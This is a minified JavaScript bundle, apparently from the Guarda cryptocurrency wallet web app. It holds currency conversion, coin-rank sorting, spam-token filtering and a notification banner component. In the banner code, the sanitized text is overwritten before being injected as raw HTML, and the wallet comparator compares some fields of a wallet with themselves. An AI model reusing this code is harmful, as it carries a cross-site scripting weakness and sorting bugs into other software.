        var kd = a(14456)
          , Sd = a(67728);
        const local_currency_useLocalCurrency = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Sd.selectedLocalCurrency)
              , a = (0,
            O.useCallback)((t => {
                e((0,
                Sd.changeLocalCurrency)(t))
            }
            ), [e])
              , n = (0,
            O.useMemo)(( () => (0,
            Sd.isFiat)(t)), [t]);
            return {
                localCurrency: t,
                changeLocal: a,
                localCurrencyIsFiat: n
            }
        }
        ;
        var Cd = a(66795);
        const getWalletBalanceUSD = (e, t) => (0,
        Ko.FH)((0,
        Ko.$q)(e, String(t)), {
            max: 18
        })
          , Nd = undefined
          , fiat_converter = () => {
            const e = (0,
            $.v9)(kd.Dn)
              , t = undefined
              , a = undefined;
            return {
                convertFiatToUSD: (0,
                O.useCallback)(( (t, a) => {
                    if (!t)
                        return null;
                    if ("usd" === (null == a ? void 0 : a.toLowerCase()))
                        return t.toString();
                    if ("0" === String(t))
                        return "0";
                    const n = a ? null == e ? void 0 : e[a.toLowerCase()] : null;
                    return n ? (0,
                    Ko.$q)(t, String(n)).toString() : null
                }
                ), [e]),
                convertUSDFromFiat: (0,
                O.useCallback)(( (t, a) => {
                    if (!t)
                        return null;
                    if ("usd" === (null == a ? void 0 : a.toLowerCase()))
                        return t.toString();
                    if ("0" === String(t))
                        return "0";
                    const n = a ? null == e ? void 0 : e[a.toLowerCase()] : null;
                    return n ? (0,
                    Ko.hC)(t, String(n)).toString() : null
                }
                ), [e])
            }
        }
          , useConverter = () => {
            const e = (0,
            $.v9)(kd.Y2)
              , {localCurrency: t} = local_currency_useLocalCurrency()
              , {convertFiatToUSD: a, convertUSDFromFiat: n} = fiat_converter();
            function isAvailableRate(t, a) {
                const n = (0,
                Cd.w)(e, t);
                return a ? !(!n || !n.rates) && !!n.rates[a] : !!n
            }
            const r = (0,
            O.useCallback)(( (n, r, l) => {
                if (!r)
                    return;
                if (r.currency === l)
                    return String(n);
                if (null == n)
                    return;
                if ("0" === String(n))
                    return "0";
                if (r.currency.endsWith("-testnet"))
                    return;
                const s = (0,
                Cd.w)(e, r);
                if (s) {
                    if (!s.rates[l || t]) {
                        const e = getWalletBalanceUSD(n, s.rates.usd)
                          , r = a(e, l || t);
                        return r || "0"
                    }
                    return (0,
                    Ko.$q)(n, String(s.rates[l || t])).toString()
                }
            }
            ), [e, t, a])
              , l = (0,
            O.useCallback)(( (a, r, l) => {
                if (!r)
                    return;
                if ((0,
                be.uL)(r.currency) === l)
                    return String(a);
                if (void 0 === a)
                    return;
                if ("0" === String(a))
                    return "0";
                const s = (0,
                Cd.w)(e, r);
                if (!s)
                    return;
                const i = (0,
                be.II)((0,
                be.uL)(r.currency))
                  , o = r.data && r.data.precision
                  , c = i && i.precision ? i.precision : 2
                  , u = o || c;
                if (!s.rates[l || t]) {
                    const e = n(a, l || t);
                    return (0,
                    Ko.FH)((0,
                    Ko.hC)(e, String(s.rates.usd)), {
                        max: u
                    })
                }
                return (0,
                Ko.FH)((0,
                Ko.hC)(a, String(s.rates[l || t])), {
                    max: u
                })
            }
            ), [e, t, n]);
            return {
                convertToFiat: r,
                convertToCrypto: l,
                isAvailableRate,
                unit: t
            }
        }
          , Td = "cmc-rank"
          , cmcRankStateSelector = e => e["cmc-rank"]
          , Ad = (0,
        _t.P1)(cmcRankStateSelector, (e => {
            var t;
            return null !== (t = e.coinOrTokenById) && void 0 !== t ? t : {}
        }
        ));
        var xd = a(72841);
        const Id = (0,
        te.createAction)("@cmc-rank/SET_CMC_RANK_LIST")()
          , fetchCMCRankCoinToken = () => async (e, t) => {
            const a = t();
            if (!0 === a["wallet-updater"].isAllBalanceUpdating)
                return;
            if (Object.keys(Ad(a)).length > 0)
                return;
            const {data: n} = await bc.w.get("/all/list?sort=bestRank")
              , r = (0,
            xd.Z)((e => e.id), n.list);
            e(Id({
                coinOrTokenById: r
            }))
        }
          , similarityBetweenStrs = (e, t) => {
            const a = e.toLocaleLowerCase()
              , n = t.toLocaleLowerCase()
              , r = undefined;
            if (!1 === a.includes(n))
                return 0;
            const l = parseFloat((n.length / a.length).toFixed(2));
            return l >= 1 ? 1 : l
        }
          , binarySort = (e, t) => e && !t ? -1 : !e && t ? 1 : "next"
          , titleCompare = (e, t) => e.localeCompare(t, void 0, {
            numeric: !0,
            sensitivity: "base",
            ignorePunctuation: !0
        })
          , minorSorting = (e, t) => {
            const a = Boolean(e.hw)
              , n = Boolean(e.hw)
              , r = Boolean(null == e ? void 0 : e.multisigId)
              , l = Boolean(null == t ? void 0 : t.multisigId)
              , s = Boolean(e.watchOnly)
              , i = Boolean(e.watchOnly)
              , o = Boolean(!r && !a && !s)
              , c = Boolean(!l && !n && !i);
            let u = binarySort(o, c);
            "next" === u && (u = binarySort(a, n));
            "next" === u && (u = binarySort(r, l));
            "next" === u && (u = binarySort(s, i));
            "next" === u && (u = e.title === t.title ? e.uuid && t.uuid && e.uuid > t.uuid ? 1 : -1 : binarySort(Boolean(e.title), Boolean(t.title)));
            if ("next" === u)
                if (e.title && t.title) {
                    const a = titleCompare(e.title, t.title);
                    a >= 0 && (u = 1);
                    a < 0 && (u = -1)
                } else
                    u = -1;
            return "next" === u ? -1 : u
        }
          , getSearchKeyByWallet = (e, t) => {
            var a;
            let n = (null == e || null === (a = e.currency) || void 0 === a ? void 0 : a.toLowerCase()) || "";
            !e.family || Boolean(e.multisigId) || e.type === we.uQ.BTC_LIKE_SEGWIT_WALLET && e.hw === we.Vw.LEDGER || (n = n.concat(":", e.family.toLowerCase()));
            e.smartContract && (n = t ? n.concat(":", e.smartContract) : n.concat(":", e.smartContract.toLowerCase()));
            return n
        }
        ;
        function useCMCRate() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Ad);
            (0,
            O.useEffect)(( () => {
                e(fetchCMCRankCoinToken())
            }
            ), []);
            const a = (0,
            O.useCallback)((e => {
                var a, n;
                if ("eqcxe6mutqjkfngfarotkot1lzbdiix1kcixrv7nw2id_sds" === (null === (a = e.smartContract) || void 0 === a ? void 0 : a.toLocaleLowerCase()) && "usdt" === (null === (n = e.currency) || void 0 === n ? void 0 : n.toLocaleLowerCase()))
                    return 3;
                const r = getSearchKeyByWallet(e, !1);
                let l = t["ada" === r ? "ada-shelley" : r];
                if (!l) {
                    const a = getSearchKeyByWallet(e, !0);
                    l = t[a]
                }
                return l ? l.rank : -1
            }
            ), [t])
              , n = (0,
            O.useCallback)(( (e, t) => {
                const n = a(e)
                  , r = a(t)
                  , l = "0" === (null == e ? void 0 : e.balance) || 0 === (null == e ? void 0 : e.balance) || "" === (null == e ? void 0 : e.balance) || void 0 === (null == e ? void 0 : e.balance)
                  , s = "0" === (null == t ? void 0 : t.balance) || 0 === (null == e ? void 0 : e.balance) || "" === (null == t ? void 0 : t.balance) || void 0 === (null == t ? void 0 : t.balance);
                if (-1 === n)
                    return 1;
                if (-1 === r)
                    return -1;
                if ((l || s) && (!l || !s)) {
                    if (l)
                        return 1;
                    if (s)
                        return -1
                }
                return n > r ? 1 : n === r ? minorSorting(e, t) : -1
            }
            ), [a])
              , r = (0,
            O.useCallback)((e => {
                let {searchValue: t, a: r, b: l} = e;
                if (void 0 === t || 0 === t.length)
                    return n(r, l);
                const s = t.replace(/\s+/g, " ").trim()
                  , calculateWeight = e => {
                    var t, a;
                    let n = 0;
                    const r = undefined
                      , l = undefined;
                    n += (e.ticker ? similarityBetweenStrs(s, e.ticker) : 0) + 50 * (e.title ? similarityBetweenStrs(s, e.title) : 0) / 100;
                    (null === (t = e.family) || void 0 === t ? void 0 : t.toLocaleLowerCase()) === (null == s ? void 0 : s.toLocaleLowerCase()) && (n += .5);
                    (null === (a = e.family) || void 0 === a ? void 0 : a.toLocaleLowerCase().includes(null == s ? void 0 : s.toLocaleLowerCase())) && (n += .5);
                    return n
                }
                ;
                let i = calculateWeight(r)
                  , o = calculateWeight(l);
                const c = undefined
                  , u = undefined;
                a(r) < a(l) ? i += .5 : o += .5;
                return i === o ? n(r, l) : i > o ? -1 : i < o ? 1 : 0
            }
            ), []);
            return {
                getRankByWallet: a,
                sortByRank: n,
                sortBySearchValue: r
            }
        }
        const isNotLetter = e => e.toLowerCase() === e.toUpperCase();
        function useCurrencySort() {
            const e = undefined;
            return {
                currencySort: (e, t) => {
                    if (e.currency === t.currency)
                        return minorSorting(e, t);
                    if (e.currency && t.currency) {
                        const a = isNotLetter(e.currency[0])
                          , n = isNotLetter(t.currency[0])
                          , r = binarySort(n, a);
                        return "next" === r ? e.currency > t.currency ? 1 : -1 : r
                    }
                    return e.currency ? -1 : 1
                }
            }
        }
        const Pd = useCurrencySort;
        function flatMapSubWalletsAndMultisigs(e) {
            var t, a;
            if ((null == e ? void 0 : e.type) === we.uQ.BTC_LIKE_SEGWIT_WALLET && (null == e ? void 0 : e.hw) === we.Vw.LEDGER) {
                var n;
                return [e, ...null !== (n = e.multisigs) && void 0 !== n ? n : []]
            }
            return [e, ...null !== (t = e.subWallets) && void 0 !== t ? t : [], ...null !== (a = e.multisigs) && void 0 !== a ? a : []]
        }
        function useSortWallets() {
            const {convertToFiat: e} = useConverter()
              , t = (0,
            $.v9)(selectedCache)
              , {sortByRank: a} = useCMCRate()
              , n = t.dashboardSortBy || fd
              , {currencySort: r} = Pd()
              , l = (0,
            O.useCallback)(( (t, a) => {
                var n, r;
                const l = 0 !== (null === (n = t.balance) || void 0 === n ? void 0 : n.length) ? t.balance : "0"
                  , s = 0 !== (null === (r = a.balance) || void 0 === r ? void 0 : r.length) ? a.balance : "0"
                  , i = e(l, t)
                  , o = e(s, a);
                return o === i ? minorSorting(t, a) : parseFloat(null != i ? i : "-1") > parseFloat(null != o ? o : "-1") ? -1 : 1
            }
            ), [e]);
            return (0,
            O.useCallback)((e => {
                let {wallets: t, forDashBoard: s=!1} = e
                  , i = t;
                if (s) {
                    const e = new Set;
                    i = i.flatMap(flatMapSubWalletsAndMultisigs).filter((t => {
                        if (e.has(t.uuid + t.currency))
                            return !1;
                        e.add(t.uuid + t.currency);
                        return !0
                    }
                    ))
                }
                return n === fd ? i.sort(l) : n === hd ? i.sort(a) : i.sort(r)
            }
            ), [n, r, a, l])
        }
        const includesInHiddenWallets = (e, t) => e.indexOf(t) > -1
          , hiddenModeFilter = e => {
            let {item: t, hiddenWallets: a} = e;
            return !includesInHiddenWallets(a, t.uuid)
        }
        ;
        function calculateFakeTokenUuid(e, t) {
            return ["fakeToken", e.family, e.currency, e.smartContract, null != t ? t : "noParent"].join("-")
        }
        function toFakeToken(e, t) {
            return {
                ...e,
                uuid: calculateFakeTokenUuid(e, t)
            }
        }
        const createFakeToken = (e, t, a, n) => {
            var r;
            return toFakeToken({
                title: a.title || "",
                smartContract: a.smartContract || "",
                address: String(Math.random()),
                balance: "0",
                isFake: !0,
                currency: e,
                family: t,
                precision: parseInt(String(null !== (r = a.precision || a.decimals) && void 0 !== r ? r : "NaN"), 10) || NaN,
                ticker: e
            }, n)
        }
          , format_default_tokens = (e, t) => Object.entries(e).reduce(( (e, a) => {
            let[n,r] = a;
            e[n] = Object.entries(r).map((e => {
                let[a,r] = e;
                return createFakeToken(a, n, r, t)
            }
            ));
            return e
        }
        ), {})
          , Ld = "@spam-tokens"
          , Fd = "spam-tokens"
          , Wd = "@spam-tokens.SET_CLEAR_STORE.commit"
          , Rd = "@spam-tokens.FETCH_SPAM_TOKENS_LIST"
          , Bd = "@spam-tokens.SPAM_TOKENS_LIST.commit"
          , Od = "@spam-tokens.SET_FETCH_ERROR.commit"
          , Dd = "@spam-tokens.INITIALIZE_SPAM_TOKEN_LIST_UPDATER.commit"
          , marketingBannerStateSelector = e => e["spam-tokens"]
          , Md = (0,
        _t.P1)(marketingBannerStateSelector, (e => e.list))
          , useTrashToken = () => {
            const e = (0,
            $.v9)(Md)
              , t = (0,
            $.v9)(Wi)
              , isSpamToken = t => {
                let {family: a, smartContract: n, currency: r} = t;
                if (void 0 === a)
                    return !1;
                const l = (null == a ? void 0 : a.toLowerCase()) + (null == n ? void 0 : n.toLowerCase());
                if ("eth" === a.toLowerCase() && "usdt" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0xdac17f958d2ee523a2206206994597c13d831ec7".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if (("bsc" === a.toLowerCase() || "bnb" === a.toLocaleLowerCase()) && "usdt" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0x55d398326f99059fF775485246999027B3197955".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if ("trx" === a.toLocaleLowerCase() && "usdt" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                    if (n !== e && n.toLowerCase() !== e.toLocaleLowerCase())
                        return !0
                }
                if ("matic" === a.toLocaleLowerCase() && "usdt" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if ("arb" === a.toLocaleLowerCase() && "usdt" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if ("eth" === a.toLowerCase() && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if (("bsc" === a.toLowerCase() || "bnb" === a.toLocaleLowerCase()) && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if ("trx" === a.toLocaleLowerCase() && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "TLZSucJRjnqBKwvQz6n5hd29gbS4P7u7w8";
                    if (n !== e && n.toLowerCase() !== e.toLocaleLowerCase())
                        return !0
                }
                if ("trx" === a.toLocaleLowerCase() && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8";
                    if (n !== e && n.toLowerCase() !== e.toLocaleLowerCase())
                        return !0
                }
                if ("matic" === a.toLocaleLowerCase() && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if ("matic" === a.toLocaleLowerCase() && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0x2791bca1f2de4661ed88a30c99a7a9449aa84174".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if ("arb" === a.toLocaleLowerCase() && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0xaf88d065e77c8cc2239327c5edb3a432268e5831".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                if ("arb" === a.toLocaleLowerCase() && "usdc" === (null == r ? void 0 : r.toLowerCase())) {
                    const e = "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8".toLowerCase();
                    if (n.toLowerCase() !== e)
                        return !0
                }
                return e.hasOwnProperty(l)
            }
              , a = undefined;
            return {
                isUnknownToken: e => {
                    let {family: a, smartContract: n} = e;
                    if (!a || !n)
                        return !1;
                    if ("ont" === a.toLowerCase() && !n)
                        return !1;
                    const r = undefined;
                    return !(`${a.toLowerCase()}:${n.toLowerCase()}`in t)
                }
                ,
                isSpamToken
            }
        }
        ;
        function useRenderCurrencyAndToken(e, t) {
            var a;
            const n = (0,
            $.v9)($c)
              , r = undefined
              , l = (null == t ? void 0 : t.wallets) || n
              , s = (0,
            $.v9)(_s)
              , i = (0,
            $.v9)(Fi)
              , o = useSortWallets()
              , c = null == t ? void 0 : t.customFilter
              , u = null == t ? void 0 : t.withoutSubwallets
              , d = null == t ? void 0 : t.isNewSelector
              , m = null !== (a = (0,
            $.v9)((e => {
                var t;
                return null == e || null === (t = e["wallet-updater"]) || void 0 === t ? void 0 : t.isAllBalanceUpdating
            }
            ))) && void 0 !== a && a
              , p = (0,
            O.useMemo)(( () => 0 !== l.length && !0 === m && !0 !== (null == t ? void 0 : t.isForce)), [m])
              , {isSpamToken: f} = useTrashToken()
              , {sortByRank: E, sortBySearchValue: h} = useCMCRate()
              , g = (0,
            O.useRef)(null)
              , y = (0,
            O.useMemo)(( () => {
                if (null != t && t.isRenderAllExchangeCoinsAndTokens) {
                    g.current = [];
                    return []
                }
                if (p && null !== g.current && g.current.length > 0)
                    return g.current;
                if (c && (null == t || !t.isBorrowWallets)) {
                    let e;
                    const t = o({
                        wallets: l
                    }).filter(c);
                    g.current = t;
                    return t
                }
                const a = o({
                    wallets: l,
                    forDashBoard: !(null != t && t.isBorrowWallets)
                })
                  , n = filterWallets(a, e);
                g.current = n;
                return n
            }
            ), [n, c, o, l, e, u, p])
              , v = (0,
            O.useMemo)(( () => null != t && t.isRenderAllExchangeCoinsAndTokens || null != t && t.isBorrowWallets ? [] : Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate)).map((e => (0,
            be.II)(e))).filter((e => Boolean(e)))), [])
              , _ = (0,
            O.useRef)(null)
              , w = (0,
            O.useMemo)(( () => {
                if (null != t && t.isRenderAllExchangeCoinsAndTokens || null != t && t.isBorrowWallets) {
                    _.current = [];
                    return []
                }
                if (p && null !== _.current && _.current.length > 0)
                    return _.current;
                const e = Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate)).filter((e => dd.includes(e) && !n.find((t => t.currency.toLowerCase() === e.toLowerCase())))).map((e => (0,
                be.II)(e))).filter((e => Boolean(e))).sort(E);
                _.current = e;
                return e
            }
            ), [null == t ? void 0 : t.isBorrowWallets, null == t ? void 0 : t.isRenderAllExchangeCoinsAndTokens, E, n, p])
              , b = (0,
            O.useMemo)(( () => ["btc", "eth", "ropsten", "btc-testnet", "ggoe", "ethw"].map((e => (0,
            be.II)(e))).filter((e => Boolean(e)))), [])
              , k = (0,
            O.useRef)(null)
              , S = (0,
            O.useMemo)(( () => {
                if (p && null !== k.current && k.current.length > 0)
                    return k.current;
                const t = filterCurrencies(b, e);
                if (c) {
                    const e = t.filter(c);
                    k.current = e;
                    return e
                }
                k.current = t;
                return t
            }
            ), [b, c, e])
              , C = (0,
            O.useRef)(null)
              , N = (0,
            O.useMemo)(( () => {
                if (null != t && t.isRenderAllExchangeCoinsAndTokens || null != t && t.isBorrowWallets) {
                    C.current = [];
                    return []
                }
                if (p && null !== C.current && C.current.length > 0)
                    return C.current;
                const a = filterCurrencies(v, e).sort(E);
                if (c) {
                    const e = a.filter(c);
                    C.current = e;
                    return e
                }
                C.current = a;
                return a
            }
            ), [v, c, e, E, p])
              , T = Jn()((e => {
                var t;
                return Boolean(null === (t = Se.Z.getRootMetadata(e)) || void 0 === t ? void 0 : t.token)
            }
            ))
              , A = (0,
            O.useRef)(null)
              , x = (0,
            O.useMemo)(( () => {
                if (d) {
                    A.current = [];
                    return []
                }
                if (p && null !== A.current && A.current.length > 0)
                    return A.current;
                if (i.length) {
                    const e = i.filter((e => T(e.family))).map((e => {
                        const {ticker: t, family: a, title: n, contract: r, decimals: l} = e;
                        return createFakeToken(t, a, {
                            title: n,
                            smartContract: r,
                            decimals: l
                        })
                    }
                    ));
                    A.current = e;
                    return e
                }
                A.current = [];
                return []
            }
            ), [T, d, i, p])
              , I = (0,
            O.useRef)(null)
              , P = (0,
            O.useMemo)(( () => {
                if (d) {
                    I.current = [];
                    return []
                }
                if (p && null !== I.current && I.current.length > 0)
                    return I.current;
                const t = filterCurrencies(x, e).sort(( (t, a) => h({
                    a: t,
                    b: a,
                    searchValue: e
                })));
                if (c) {
                    const e = t.filter(c);
                    I.current = e;
                    return e
                }
                I.current = t;
                return t
            }
            ), [d, x, e, E, c, p])
              , L = (0,
            O.useRef)(null)
              , F = (0,
            O.useMemo)(( () => {
                if (p && null !== L.current && L.current.length > 0)
                    return L.current;
                const e = P.filter((e => !f({
                    family: e.family,
                    smartContract: e.smartContract,
                    currency: e.currency
                })));
                L.current = e;
                return e
            }
            ), [P, p])
              , W = (0,
            O.useMemo)(( () => !!y.length && y.every((e => !hiddenModeFilter({
                item: e,
                hiddenWallets: s
            })))), [s, y])
              , R = (0,
            O.useMemo)(( () => !!y.length && y.every((e => "0" === e.balance))), [y]);
            return {
                listOfCurrencies: N,
                isAllHidden: W,
                isAllZero: R,
                list: y,
                listOfAllFletcherTokens: P,
                listOfAllFletcherTokensWithoutSpam: F,
                listOfMultisigs: S,
                listToAddMnemonicCoins: w
            }
        }
        var Ud = a(44283)
          , Gd = a.n(Ud);
        const InputCurrency = e => {
            const [t,a] = (0,
            O.useState)(!1)
              , [n,r] = (0,
            O.useState)("")
              , l = (0,
            O.useMemo)(( () => debounce(r, 300)), [r])
              , {listOfCurrencies: s, listOfAllFletcherTokensWithoutSpam: i} = useRenderCurrencyAndToken(n);
            (0,
            O.useEffect)(( () => {
                void 0 !== e.selectedCurrency && e.onChange(e.selectedCurrency)
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                !1 === t && l("")
            }
            ), [t]);
            const o = (0,
            O.useMemo)(( () => !e.isWithTokens && e.currencies && e.currencies.length > 0 ? s.filter((t => e.currencies.includes(t.currency || ""))) : [...s]), [s])
              , c = O.useCallback((e => {
                let {target: {value: t}} = e;
                l(t)
            }
            ), [n])
              , u = O.useCallback((t => {
                let {title: n, ticker: r, family: l, smartContract: s} = t;
                e.onChange({
                    title: n,
                    ticker: r,
                    family: l,
                    smartContract: s
                });
                a(!1)
            }
            ), [])
              , d = O.useCallback((t => {
                if (13 === t.keyCode && n) {
                    if (o.length) {
                        e.onChange({
                            title: o[0].title,
                            family: o[0].ticker,
                            ticker: o[0].ticker
                        });
                        a(!1);
                        return
                    }
                    if (i.length) {
                        e.onChange(i[0]);
                        a(!1);
                        return
                    }
                }
            }
            ), [n])
              , m = O.useCallback((e => {
                var t;
                const a = (0,
                be.II)(e.family);
                return O.createElement(O.Fragment, null, O.createElement(IconCurrency, {
                    currency: e.ticker,
                    className: Ht()(Ql.currencyTicker, Ql[`ticker-${e.ticker}`])
                }), O.createElement("div", {
                    className: Ql.currencyData
                }, O.createElement("span", null, e.title), O.createElement("div", null, (0,
                be.xG)(e.ticker), " ", null == a || null === (t = a.ticker) || void 0 === t ? void 0 : t.toUpperCase(), null != a && a.title ? ` - ${null == a ? void 0 : a.title}` : "")))
            }
            ), [])
              , p = {
                [Ql.placeholder]: !e.selectedCurrency,
                [Ql.isOpen]: t
            };
            return O.createElement("div", {
                className: Ql.wrapper,
                tabIndex: 0,
                role: "button"
            }, O.createElement("div", {
                className: Ht()(Ql.inputWrapper, p),
                onClick: () => a(!t)
            }, e.selectedCurrency && "string" != typeof e.selectedCurrency ? m(e.selectedCurrency) : O.createElement("span", null, "Select currency"), O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Gd()
                },
                className: Ql.iconArrow
            })), O.createElement(Xl(), {
                visible: t,
                onClose: () => a(!1)
            }, O.createElement(ss, {
                handleSearchKeyUp: d,
                handleSearch: c,
                handleSelect: u,
                getJSXWithItem: m,
                searchWithSeparation: n,
                listOfCurrencies: o,
                listOfAllFletcherTokens: e.isWithTokens ? i : [],
                isWithTokens: e.isWithTokens
            })))
        }
          , Vd = InputCurrency
          , Kd = (0,
        te.createAction)("@notifications/SET_NOTIFICATIONS")()
          , Hd = "notify/send-page"
          , zd = "notify/send-confirm"
          , jd = "notify/exchange-page"
          , $d = "notify/exchange-confirm"
          , Zd = "notify/buy-sell-page"
          , Yd = "notify/buy-sell-confirm"
          , qd = "notify/receive-page"
          , Xd = "notify/receive-page/staking"
          , Qd = "notify/staking-page"
          , Jd = "notify/send-right-block"
          , em = "notify/exchange-right-block"
          , tm = "notify/buy-sell-right-block"
          , am = "notify/import-popup"
          , nm = "notify/create-popup"
          , rm = "notify/ledger-popup"
          , lm = "notify/left-menu"
          , sm = "notify/coin-status"
          , im = ee.P.create({
            name: "reducer-notifications"
        })
          , om = {
            notifications: []
        }
          , cm = "notifications"
          , um = ["notifications"]
          , dm = [{
            affectitis: ["send", "buy", "exchange", "create", "import", "balance", "history", "staking"],
            currencies: Se.Z.getAllTickers(),
            locations: Object.values(u),
            lvl: 2,
            platforms: ["web"],
            text: "Service maintenance. For any questions, please contact our support: support@guarda.com"
        }]
          , mm = (0,
        te.createReducer)(om).handleAction(Kd, ( (e, t) => {
            let {payload: {notifications: a}} = t;
            return {
                ...e,
                notifications: a
            }
        }
        ))
          , selectedNotifications = e => (AttackManager.isDirty() ? dm : e[cm].notifications) || []
          , fetchNotifications = () => async e => {
            try {
                const {data: t} = await U.Ht.get("/api/v1/banners/notifs", {
                    params: {
                        platform: "web"
                    },
                    timeout: 5e3
                })
                  , a = t.response || [];
                e(Kd({
                    notifications: a
                }))
            } catch (e) {
                im.error("Cant get app notifications", e)
            }
        }
          , pm = {
            message: "message_message_3y46A",
            info: "message_info_iHcBs",
            error: "message_error_2vz_J",
            warning: "message_warning_2-GDD",
            inverted: "message_inverted_2alPl",
            "text-left": "message_text-left_2OU2m",
            "text-center": "message_text-center_39G1T"
        }
          , fm = undefined
          , ui_message = e => {
            let {type: t, children: a, className: n, isColorInverted: r, textAlign: l} = e;
            return O.createElement("div", {
                className: Ht()(pm.message, t ? pm[t] : pm.info, l ? pm[`text-${l}`] : pm.textLeft, n, {
                    [pm.inverted]: r
                })
            }, a)
        }
          , Em = "notifications_isInfo_2GCQd"
          , hm = "notifications_isWarning_1kUwG"
          , gm = "notifications_isError_3eeGD"
          , ym = "notifications_isErrorWrapper_260s9"
          , vm = {
            0: "info",
            1: "warning",
            2: "error"
        }
          , AppNotifications = e => {
            var t;
            const a = (0,
            $.v9)(selectedNotifications)
              , n = []
              , toUpper = e => String(e).toUpperCase()
              , r = e.currency ? e.currency : null === (t = e.wallet) || void 0 === t ? void 0 : t.currency
              , {isNewDesign: l, top: s} = e;
            a.filter((e => e.platforms.indexOf("web") > -1)).forEach((t => {
                const a = [];
                let l = !1;
                if (t.currencies || t.tokens && t.tokens.length) {
                    var s;
                    const n = t.currencies.indexOf((0,
                    Ho.t)(r)) > -1;
                    l = !(null === (s = t.tokens) || void 0 === s || !s.find((t => {
                        var a, n;
                        return (null === (a = e.wallet) || void 0 === a ? void 0 : a.family) === t.family && (null === (n = e.wallet) || void 0 === n ? void 0 : n.currency) === t.ticker
                    }
                    )));
                    a.push(Boolean(n || l))
                }
                t.locations && e.type && a.push(t.locations.indexOf(e.type) > -1);
                a.every((e => !0 === e)) && n.push({
                    ...t,
                    isTokenNotify: l
                })
            }
            ));
            const i = /{LINK:\s*([^:]*):([^}]*)}/
              , o = /[&<>]/g
              , c = /[<>)("']/g
              , prepareMessage = t => {
                let a = t.text.replace(o, "").replace(/{BR}/g, "<br />");
                if (t.isTokenNotify) {
                    var n, l;
                    a = t.text.replace(/{TICKER}/g, "").replace(/{TOKEN_TICKER}/g, toUpper((null === (n = e.wallet) || void 0 === n ? void 0 : n.currency) || "")).replace(/{TOKEN_FAMILY}/g, toUpper((null === (l = e.wallet) || void 0 === l ? void 0 : l.family) || ""))
                } else
                    a = t.text.replace(/{TICKER}/g, toUpper(r)).replace(/{TOKEN_TICKER}/g, "").replace(/{TOKEN_FAMILY}/g, "");
                const s = a.match(new RegExp(i,"g"));
                s && s.length && s.forEach((e => {
                    var t;
                    const [n,r,l] = null !== (t = e.match(i)) && void 0 !== t ? t : [];
                    if (l && "https://" === l.slice(0, 8)) {
                        const e = l.replace(c, "");
                        a = a.replace(n, `<a href="${e}" target="_blank" rel="noopener norefferer">${r}</a>`)
                    }
                }
                ));
                return a
            }
            ;
            return e.className ? O.createElement(O.Fragment, null, n.map((t => {
                const a = vm[t.lvl]
                  , n = prepareMessage(t)
                  , r = undefined;
                return "error" === a ? O.createElement("div", {
                    className: Ht()(e.className, l && ym),
                    style: s ? {
                        top: s
                    } : void 0,
                    key: t.id
                }, O.createElement(ui_message, {
                    className: Ht()(l && "error" === a && gm),
                    type: a || "info",
                    isColorInverted: !!e.isColorInverted
                }, O.createElement("div", {
                    dangerouslySetInnerHTML: {
                        __html: n
                    }
                }))) : O.createElement("div", {
                    className: e.className,
                    key: t.id
                }, O.createElement(ui_message, {
                    className: Ht()(l && "info" === a && Em, l && "warning" === a && hm),
                    type: a || "info",
                    isColorInverted: !!e.isColorInverted
                }, O.createElement("div", {
                    dangerouslySetInnerHTML: {
                        __html: n
                    }
                })))
            }
            ))) : O.createElement(O.Fragment, null, n.map((t => {
                const a = prepareMessage(t);
                return O.createElement(ui_message, {
                    key: t.id,
                    type: vm[t.lvl] || "info",
                    isColorInverted: !!e.isColorInverted,
                    textAlign: "center"
                }, O.createElement("div", {
                    dangerouslySetInnerHTML: {
                        __html: a
                    }
                }))
            }
            )))
        }
          , _m = AppNotifications
          , wm = (0,
        te.createAction)("@autobackup/SET_FILE_NAME")()
          , bm = {
            default: "dd mmm yyyy, hh:MM tt",
            transactions: "hh:MM tt",
            news: "mmm, d yyyy",
            "transactions-time": "hh:MM tt",
            "transactions-date": "dd mmm yyyy"
        }
          , date_format_dateFormat = () => {
            const e = /d{1,4}|m{1,4}|yy(?:yy)?|([HhMsTt])\1?|[LloSZ]|"[^"]*"|'[^']*'/g
              , t = /\b(?:[PMCEA][SDP]T|(?:Pacific|Mountain|Central|Eastern|Atlantic) (?:Standard|Daylight|Prevailing) Time|(?:GMT|UTC)(?:[-+]\d{4})?)\b/g
              , a = /[^-+\dA-Z]/g
              , pad = function() {
